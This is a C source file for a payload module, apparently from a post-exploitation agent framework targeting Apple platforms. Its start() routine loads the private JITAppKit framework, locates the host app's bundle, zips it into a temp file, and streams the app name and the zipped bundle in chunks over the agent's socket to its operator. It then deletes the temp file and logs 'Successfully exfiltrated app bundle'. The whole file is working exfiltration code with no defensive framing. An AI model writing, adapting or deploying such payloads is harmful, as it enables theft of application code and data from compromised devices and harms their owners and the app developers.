#include <payload.h>

#define CHUNK_SIZE 1024


void start(void *entry, agent_p agent)
{
    uint8_t buffer[CHUNK_SIZE];
    void    *app_path   = NULL,
            *dest_path  = NULL,
            *app_name   = NULL;
    char *c_dest_path   = NULL;
    uint64_t    size    = 0,
                b_read  = 0;
    struct stat sb;
    int fd = -1;

    log_info("Loading JITAppKit.framework");
    if (!objcLoadBundle("/System/Library/PrivateFrameworks/JITAppKit.framework")) {
        log_error("Failed to load JITAppKit.framework");
        goto cleanup;
    }

    if ((app_path = getAppPath()) == NULL) {
        log_error("Failed to get path to app bundle");
        goto cleanup;
    }

    app_name = objcMsgSendCast()(
        app_path,
        objcGetSelector(lastPathComponent)
    );

    if (app_name == NULL) {
        log_error("Failed to get app name");
        goto cleanup;
    }

    log_info("Sending app name: %s", CSTRING(app_name));
    size = agent->trampoline.strlen(CSTRING(app_name));
    agent->trampoline.send(agent->fd, &size, sizeof(size), 0);
    agent->trampoline.send(agent->fd, CSTRING(app_name), size, 0);
    size = 0;

    if ((dest_path = getTempPath()) == NULL || (c_dest_path = CSTRING(dest_path)) == NULL) {
        log_error("Failed to create temp path");
        goto cleanup;
    }

    log_info("Zipping app bundle");
    objcMsgSendCast(void *, void *)(
        objcGetClass(Main),
        objcGetSelector(createZipFileAtPath:withContentsOfDirectory:),
        dest_path,
        app_path
    );

    if (agent->trampoline.stat(c_dest_path, &sb) != 0) {
        log_error("Failed to stat '%s': %s", c_dest_path, agent->trampoline.strerror(*(agent->trampoline.errno)));
        goto cleanup;
    }

    if ((size = sb.st_size) < 0) {
        log_error("Invalid file size: %llu", size);
        size = 0;
        goto remove_file;
    }

    if ((fd = agent->trampoline.open(c_dest_path, O_RDONLY)) < 0) {
        log_error("Failed to open '%s': %s", c_dest_path, agent->trampoline.strerror(*(agent->trampoline.errno)));
        size = 0;
        goto remove_file;
    }

    log_info("Sending zipped app bundle with size: %llu", size);
    if (agent->trampoline.send(agent->fd, &size, sizeof(size), 0) != sizeof(size)) {
        log_error("Failed to send buffer size: %s", agent->trampoline.strerror(*(agent->trampoline.errno)));
        goto remove_file;
    }

    while (b_read < size) {
        ssize_t ret = agent->trampoline.read(fd, buffer, CHUNK_SIZE);
        if (ret < 0) {
            log_error("Read error: %s", agent->trampoline.strerror(*(agent->trampoline.errno)));
            goto remove_file;
        }

        if (agent->trampoline.send(agent->fd, buffer, ret, 0) != ret) {
            log_error("Failed to send buffer chunk of size: %llu %s", ret, agent->trampoline.strerror(*(agent->trampoline.errno)));
            goto remove_file;
        }

        b_read += ret;
    }

    log_info("Successfully exfiltrated app bundle");

remove_file:
    if (agent->trampoline.remove(c_dest_path) != 0)
        log_error("Failed to remove zipped app bundle: %s", agent->trampoline.strerror(*(agent->trampoline.errno)));
cleanup:
    if (fd >= 0)
        agent->trampoline.close(fd);

    if (size == 0)
        agent->trampoline.send(agent->fd, &size, sizeof(size), 0);
}

#undef CHUNK_SIZE